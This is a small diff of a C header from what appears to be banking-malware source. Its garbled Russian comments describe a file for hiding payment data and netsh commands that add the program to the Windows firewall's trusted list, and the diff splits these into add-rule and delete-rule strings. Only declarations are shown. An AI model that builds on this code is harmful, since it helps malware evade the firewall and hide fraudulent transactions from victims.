@@ -194,7 +194,8 @@ extern CSSTR TinyOldDocs[]; //им€ файла дл€ хранени€ данных по скрываемым платеж
 
 //команда дл€ добавлени€ в список доверенных браундмаузера
 extern CSSTR NetshFirewallWinXp[]; //дл€ windows XP
-extern CSSTR NetshFirewallWin7[]; //дл€ windows 7
+extern CSSTR NetshFirewallWin7Add[]; //дл€ windows 7 добавление правила
+extern CSSTR NetshFirewallWin7Del[]; //дл€ windows 7 удаление правила
 
 //*********************************************************************
 //                            Ќе шифрованные строки и данные
